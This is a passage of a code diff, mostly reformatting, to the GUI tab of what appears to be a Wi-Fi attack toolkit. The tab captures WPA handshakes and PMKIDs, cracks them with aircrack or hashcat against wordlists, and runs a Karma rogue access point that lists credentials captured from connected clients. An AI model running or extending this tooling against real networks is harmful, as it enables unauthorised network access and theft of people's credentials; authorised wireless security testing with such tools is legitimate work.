+                ).exists() and self.orchestrator.aircrack.check_handshake(
+                    cap_file, bssid
+                ):
+                    found = True
+                    break
+
             self.orchestrator.layer.kill_background(proc)
             return {"success": found, "file": cap_file}
 
@@ -809,22 +1007,24 @@ class WiFiArsenalTab(QWidget):
 
     def _capture_pmkid(self):
         iface = self.iface_combo.currentData()
-        if not iface: return
+        if not iface:
+            return
         self._stop_scan()
         self.lbl_result.setText("● Capturing PMKID…")
-        
+
         def _do_pmkid():
             mon = self.orchestrator.ensure_monitor_mode(iface)
             out = "/tmp/james_pmkid.pcapng"
             hash_out = "/tmp/james_pmkid.hc22000"
             self.orchestrator.layer.run(f"rm -f {out} {hash_out}")
-            
+
             self.orchestrator.hcxtools.capture_pmkid(mon, out, timeout=30)
-            if not Path(out).exists(): return {"success": False}
-            
+            if not Path(out).exists():
+                return {"success": False}
+
             res = self.orchestrator.hcxtools.extract_hashes(out, hash_out)
             return {"success": res.get("success", False), "file": hash_out}
-            
+
         self.worker = WorkerThread(_do_pmkid)
         self.worker.finished.connect(self._on_capture_done)
         self.worker.start()
@@ -843,37 +1043,57 @@ class WiFiArsenalTab(QWidget):
             self.wl_combo.addItem(f"{w['name']} ({w['size_mb']}MB)", w["path"])
 
     def _browse_capture(self):
-        f, _ = QFileDialog.getOpenFileName(self, "Select Capture", "/tmp", "Caps (*.cap *.pcap *.hc22000);;All (*)")
-        if f: self.lbl_cap_file.setText(f)
+        f, _ = QFileDialog.getOpenFileName(
+            self,
+            "Select Capture",
+            "/tmp",
+            "Caps (*.cap *.pcap *.hc22000);;All (*)",
+        )
+        if f:
+            self.lbl_cap_file.setText(f)
+
     def _browse_wordlist(self):
-        f, _ = QFileDialog.getOpenFileName(self, "Select Wordlist", "/usr/share/wordlists", "Text (*.txt);;All (*)")
-        if f: 
+        f, _ = QFileDialog.getOpenFileName(
+            self,
+            "Select Wordlist",
+            "/usr/share/wordlists",
+            "Text (*.txt);;All (*)",
+        )
+        if f:
             self.wl_combo.insertItem(0, f"Custom ({Path(f).name})", f)
             self.wl_combo.setCurrentIndex(0)
 
     def _crack(self, engine="smart"):
         cap = self.lbl_cap_file.text()
         wl = self.wl_combo.currentData()
-        if cap == "None" or not Path(cap).exists(): return
+        if cap == "None" or not Path(cap).exists():
+            return
         self.lbl_result.setText(f"● Cracking ({engine})…")
 
         def crack_task():
             if engine == "aircrack":
-                return self.orchestrator.crack_handshake(cap, wl, self.selected_bssid)
-            elif engine == "hashcat" or str(cap).endswith('.hc22000'):
-                hc_file = cap + ".hc22000" if not cap.endswith('.hc22000') else cap
-                if not cap.endswith('.hc22000'):
+                return self.orchestrator.crack_handshake(
+                    cap, wl, self.selected_bssid
+                )
+            elif engine == "hashcat" or str(cap).endswith(".hc22000"):
+                hc_file = (
+                    cap + ".hc22000" if not cap.endswith(".hc22000") else cap
+                )
+                if not cap.endswith(".hc22000"):
                     self.orchestrator.hcxtools.extract_hashes(cap, hc_file)
                 return self.orchestrator.crack_hash(hc_file, wl, mode=22000)
             else:
-                return self.orchestrator.crack_wpa_smart(cap, wl, self.selected_bssid, self.selected_essid)
+                return self.orchestrator.crack_wpa_smart(
+                    cap, wl, self.selected_bssid, self.selected_essid
+                )
 
         self.worker = WorkerThread(crack_task)
         self.worker.finished.connect(self._on_crack_done)
         self.worker.start()
 
     def _on_crack_done(self, res):
-        if isinstance(res, Exception): self.lbl_result.setText("● Error")
+        if isinstance(res, Exception):
+            self.lbl_result.setText("● Error")
         elif res.get("found") or res.get("success"):
             k = res.get("key") or res.get("cracked_keys")
             self.lbl_result.setText(f"● KEY: {k}")
@@ -886,7 +1106,9 @@ class WiFiArsenalTab(QWidget):
         self.btn_karma_start.setEnabled(False)
         self.btn_karma_stop.setEnabled(True)
         self.karma_worker = AutoKarmaWorker(
-            self.orchestrator, ssid=self.txt_ssid.text(), portal=self.combo_portal.currentText()
+            self.orchestrator,
+            ssid=self.txt_ssid.text(),
+            portal=self.combo_portal.currentText(),
         )
         self.karma_worker.log_signal.connect(self.karma_log.appendPlainText)
         self.karma_worker.status_signal.connect(self._update_karma_status)
@@ -894,25 +1116,36 @@ class WiFiArsenalTab(QWidget):
         self.karma_worker.start()
 
     def _stop_karma(self):
-        if self.karma_worker: self.karma_worker.stop()
+        if self.karma_worker:
+            self.karma_worker.stop()
 
     def _update_karma_status(self, st):
-        self.lbl_karma_clients.setText(f"💻 Clients: {st.get('client_count',0)}")
+        self.lbl_karma_clients.setText(
+            f"💻 Clients: {st.get('client_count',0)}"
+        )
         self.lbl_karma_dns.setText(f"🌐 DNS: {st.get('dns_count',0)}")
         self.lbl_karma_creds.setText(f"🔑 Creds: {st.get('cred_count',0)}")
-        
-        cli = st.get('clients', [])
+
+        cli = st.get("clients", [])
         self.karma_clients_tbl.setRowCount(len(cli))
         for i, c in enumerate(cli):
-            self.karma_clients_tbl.setItem(i,0,QTableWidgetItem(c.get('ip','')))
-            self.karma_clients_tbl.setItem(i,1,QTableWidgetItem(c.get('mac','')))
-            
-        creds = st.get('creds', [])
+            self.karma_clients_tbl.setItem(
+                i, 0, QTableWidgetItem(c.get("ip", ""))
+            )
+            self.karma_clients_tbl.setItem(
+                i, 1, QTableWidgetItem(c.get("mac", ""))
+            )
+
+        creds = st.get("creds", [])
         self.karma_creds_tbl.setRowCount(len(creds))
         for i, c in enumerate(creds):
-            self.karma_creds_tbl.setItem(i,0,QTableWidgetItem(c.get('_client_ip','')))
-            payload = str({k:v for k,v in c.items() if not k.startswith('_')})
-            self.karma_creds_tbl.setItem(i,1,QTableWidgetItem(payload))
+            self.karma_creds_tbl.setItem(
+                i, 0, QTableWidgetItem(c.get("_client_ip", ""))
+            )
+            payload = str(
+                {k: v for k, v in c.items() if not k.startswith("_")}
+            )
+            self.karma_creds_tbl.setItem(i, 1, QTableWidgetItem(payload))
 
     def _on_karma_finished(self, ok):
         self.btn_karma_start.setEnabled(True)
